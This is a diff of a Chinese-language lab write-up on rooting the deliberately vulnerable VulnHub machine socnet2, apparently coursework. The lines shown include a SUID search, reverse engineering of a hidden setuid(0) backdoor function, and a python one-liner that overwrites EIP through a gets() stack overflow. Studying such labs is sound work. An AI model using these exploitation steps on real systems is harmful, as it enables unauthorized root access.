@@ -2,13 +2,13 @@
 
 !!! quote "使用的靶机为 VulnHub hard-socnet2"
 
-!!! success "比 Lab 5 难"
+!!! success "比 Lab05 难"
 
 ## 渗透目的
 
 取得目标靶机的 root 权限
 
-了解 XML 语法；了解 Linux 栈溢出攻击的原理与具体操作
+了解 XML 语法并构造 XML 请求；了解 Linux 栈溢出攻击的原理与具体操作
 
 ## 具体操作
 
@@ -400,9 +400,9 @@ python -c "import pty; pty.spawn('/bin/bash')"
 socnet@socnet2:~$ 
 ```
 
-获得了一个权限更高的 `socnet` 用户 Shell，下一步就是获取 `root` 用户
+获得了一个权限更高的 `socnet` 用户 Shell，下一步就是获取 `root` Shell
 
-考虑到之前发现过一个 suid 文件，扫一下 suid
+之前发现过一个 suid 文件，扫一下 suid
 
 ```
 socnet@socnet2:~$ find / -perm -4000 -type f 2>/dev/null
@@ -451,9 +451,13 @@ Years 113, Salary 114, Trouble 1, Comments Give me ur root account :)
 Warning: not running or target is remote
 ```
 
-没什么线索，用 IDA 逆向一番，发现一个直接叫作 backdoor 的函数，植入的是任意代码执行
+没什么线索，用 IDA 逆向一番，发现一个直接叫作 backdoor 的函数，植入的是任意代码执行（注意 `setuid(0);`）
 
-![image-20251028143738469](images/image-20251028143738469.png)![image-20251028150451711](images/image-20251028150451711.png)
+![image-20251028143738469](images/image-20251028143738469.png)
+
+（对应的汇编地址与内容）
+
+![image-20251028150451711](images/image-20251028150451711.png)
 
 不幸的是，这个函数没有被其他的任何函数引用，因此考虑需要在某处执行内存溢出攻击
 
@@ -506,7 +510,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-根据之前写 PWN 题的经验，`gets(src);` 这里完全不限制输入长度，考虑从这里栈溢出攻击
+根据之前写 PWN 题的经验，`gets(src);` 这里完全不限制输入长度（相比之下 `fgets(s, 25, stdin);` 有明显的实际读取限制），考虑从这里栈溢出攻击
 
 这里需要构造一个足够长的字符串，使得 `eip` 寄存器的值被顺利覆盖，并且覆盖是可控的
 
@@ -516,7 +520,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 aaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaaaAaaaBaaaCaaaDaaaEaaaFaaaGaaaHaaaIaaaJaaaKaaaLaaaMaaaNaaaOaaaPaaaQaaaRaaaSaaaTaaaUaaaVaaaWaaaXaaaYaaaZ...
 ```
 
-然后进行测试：
+然后进行测试，构造栈溢出：
 
 ```
 Explain: aaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaaaAaaaBaaaCaaaDaaaEaaaFaaaGaaaHaaaIaaaJaaaKaaaLaaaMaaaNaaaOaaaPaaaQaaaRaaaSaaaTaaaUaaaVaaaWaaaXaaaYaaaZ
@@ -537,8 +541,8 @@ EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow
 
 `EIP` 的值为 `apaa`，我们知道了这四位字符串对应的位置就是写入返回地址的位置，尝试注入后门函数的首地址 `0x08048676`，虽然无法输入 `\x86` 这样的原始十六进制，但是可以通过 payload 脚本实现
 
-```
-python -c "import struct; print('1\n1\n1\n1\n' + 'aaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaa' + '\x76\x86\x04\x08')" > payload
+```python
+python -c "print('1\n1\n1\n1\n' + 'aaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaa' + '\x76\x86\x04\x08')" > payload
 ```
 
 在 gdb 中试一试：
@@ -581,3 +585,15 @@ Warning: not running or target is remote
 ## 其他
 
 获取 root 权限用时约 5h
+
+---
+
+## 备注
+
+摘自 ICS 课程教材《计算机系统 基于 x86+Linux 平台》From P165
+
+![image-20251029172025262](images/image-20251029172025262.png)
+
+![image-20251029172103360](images/image-20251029172103360.png)
+
+![image-20251029172124081](images/image-20251029172124081.png)
